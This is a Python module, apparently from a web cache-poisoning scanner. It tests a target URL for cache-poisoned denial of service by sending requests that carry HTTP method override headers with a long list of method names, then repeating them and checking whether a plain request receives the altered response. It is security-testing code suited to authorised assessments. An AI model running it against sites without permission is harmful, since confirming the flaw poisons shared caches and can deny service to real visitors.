#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Attempts to find Cache Poisoning with HTTP Method Override (HMO)
https://cpdos.org/#HMO
"""

from utils.utils import requests, random, configure_logger, human_time
from utils.style import Identify, Colors
import utils.proxy as proxy

logger = configure_logger(__name__)

VULN_NAME = "HTTP Method Override"

CONTENT_DELTA_RANGE = 500
BIG_CONTENT_DELTA_RANGE = 5000

def HMO(url, s, initial_response, authent, human):
    """Function to test for HTTP Method Override vulnerabilities"""

    logger.debug("Testing for %s vulnerabilities", VULN_NAME)

    methods = [
        "GET",
        "POST",
        "PATCH",
        "PUT",
        "DELETE",
        "HEAD",
        "TRACE",
        "HELP",
        "OPTIONS",
        "CONNECT",
        "PURGE",
        "RESUME",
        "SEARCH",
        "MERGE",
        "LOCK",
        "UNLOCK",
        "SYNC",
        "ARCHIVE",
        "CLONE",
        "ROLLBACK",
        "EXECUTE",
        "INTROSPECT",
        "NONSENSE",
        # WebDAV methods
        "REPORT",
        "CHECKOUT",
        "COPY",
        "MOVE",
        "MKACTIVITY",
        "MKCOL",
        "PROPFIND",
        "PROPPATCH",
        "VERSION-CONTROL",
        "BASELINE-CONTROL",
        "CHECKIN",
        "UNCHECKOUT",
        "UPDATE",
        "LABEL",
        "MKWORKSPACE",
        "ORDERPATCH",
        "ACL",
        # Event/Notification methods
        "SUBSCRIBE",
        "UNSUBSCRIBE", 
        "NOTIFY",
        "POLL",
        # Binding methods
        "BIND",
        "UNBIND",
        "REBIND",
        "LINK",
        "UNLINK",
        # Calendar methods
        "MKCALENDAR",
        # Custom/Exotic methods
        "BATCH",
        "SPACEJUMP",
        "TRACK",
        "BREW",
        "WHEN",
        # Potential attack methods
        "INVALID",
        "BADMETHOD",
        "EXPLOIT",
        "ADMIN",
        "ROOT",
        "BACKDOOR",
        "SHELL",
        "EXEC",
        "EVAL",
        "INCLUDE",
        "REQUIRE",
        "IMPORT",
        "LOAD",
        "DUMP",
        "BACKUP",
        "RESTORE",
        "RESET",
        "FLUSH",
        "CLEAR",
        "WIPE",
        "DESTROY",
        "KILL",
        "TERMINATE",
        "ABORT",
        "CANCEL",
        "STOP",
        "HALT",
        "PAUSE",
        "SUSPEND",
        "CONTINUE",
        "RETRY",
        "REDO",
        "UNDO",
        "REVERT",
        "COMMIT",
        "SAVE",
        "STORE",
        "CACHE",
        "PREFETCH",
        "PRELOAD",
        "REFRESH",
        "RELOAD",
        "RENEW",
        "REPAIR",
        "FIX",
        "HEAL",
        "RECOVER",
        "RESCUE",
        "ESCAPE",
        "BYPASS",
        "OVERRIDE",
        "FORCE",
        "PUSH",
        "PULL",
        "FETCH",
        "GRAB",
        "TAKE",
        "GIVE",
        "SEND",
        "RECV",
        "RECEIVE",
        "ACCEPT",
        "REJECT",
        "DENY",
        "ALLOW",
        "PERMIT",
        "GRANT",
        "REVOKE",
        "AUTHORIZE",
        "AUTHENTICATE",
        "LOGIN",
        "LOGOUT",
        "SIGNIN",
        "SIGNOUT",
        "REGISTER",
        "UNREGISTER",
    ]

    hmo_headers = [
        "HTTP-Method-Override",
        "X-HTTP-Method-Override",
        "X-Method-Override",
        "Method-Override",
        "X-HTTP-Method",
        "HTTP-Method",
        "_method",
        "_methodOverride",
        "X-Requested-Method",
        "X-HTTP-Verb",
        "Request-Method",
        "Override-Method",
        "X-Method",
        "Method",
        "X-Verb",
        "Verb-Override",
        "HTTP-Verb",
        "X-Override",
        "Override",
        "X-Action",
        "Action-Override",
        "X-Request-Method",
        "Request-Override",
        "X-Tunnel-Method",
        "Tunnel-Method",
        "X-Real-Method",
        "Real-Method",
        "X-Original-Method",
        "Original-Method",
        "X-Forward-Method",
        "Forward-Method",
        "X-Proxy-Method",
        "Proxy-Method",
    ]

    main_status_code = initial_response.status_code
    main_len = len(initial_response.content)

    for header, method in (
        (header, method) for header in hmo_headers for method in methods
    ):
        uri = f"{url}{random.randrange(999)}"
        reason = ""
        try:
            probe_headers = {header: method}
            print(f" \033[34m {VULN_NAME} : {probe_headers}\033[0m\r", end="")
            print("\033[K", end="")
            probe = s.get(
                uri,
                headers=probe_headers,
                verify=False,
                timeout=10,
                auth=authent,
                allow_redirects=False,
            )
            human_time(human)

            range_exlusion = range(main_len - CONTENT_DELTA_RANGE, main_len + CONTENT_DELTA_RANGE) if main_len < 10000 else range(main_len - BIG_CONTENT_DELTA_RANGE, main_len + BIG_CONTENT_DELTA_RANGE)
            #print(range_exlusion)

            if probe.status_code != main_status_code and probe.status_code not in [
                main_status_code, 429, 403
            ]:
                reason = (
                    f"DIFFERENT STATUS-CODE {main_status_code} > {probe.status_code}"
                )
                status = f"{Identify.behavior}"
                severity = "behavior"
            elif len(probe.content) != main_len and len(probe.content) not in range_exlusion and probe.status_code not in [
                main_status_code, 429, 403
            ]:
                reason = (
                    f"DIFFERENT RESPONSE LENGTH {main_len}b > {len(probe.content)}b"
                )
                #print(probe.content)
                status = f"{Identify.behavior}"
                severity = "behavior"
            elif probe.status_code == main_status_code and len(probe.content) in range_exlusion:
                continue

            for _ in range(5):
                probe = s.get(
                    uri,
                    headers=probe_headers,
                    verify=False,
                    timeout=10,
                    auth=authent,
                    allow_redirects=False,
                )
                human_time(human)
            control = s.get(uri, verify=False, timeout=10, auth=authent)
            if control.status_code == probe.status_code and control.status_code not in [
                main_status_code,
                429, 403
            ]:
                reason = (
                    f"DIFFERENT STATUS-CODE {main_status_code} > {control.status_code}"
                )
                status = f"{Identify.confirmed}"
                severity = "confirmed"

            if len(control.content) == len(probe.content) and len(probe.content) not in range_exlusion and control.status_code not in [429, 403]:
                reason = (
                    f"DIFFERENT RESPONSE LENGTH {main_len}b > {len(control.content)}b"
                )
                #print(control.content)
                status = f"{Identify.confirmed}"
                severity = "confirmed"

            if reason:
                print(
                    f" {status} | HMO DOS | \033[34m{uri}\033[0m | {reason} | PAYLOAD: {Colors.THISTLE}{probe_headers}{Colors.RESET}"
                )
                if proxy.proxy_enabled:
                    from utils.proxy import proxy_request
                    proxy_request(s, "GET", uri, headers=probe_headers, data=None, severity=severity)

        except requests.exceptions.ConnectionError as e:
            logger.exception(e)
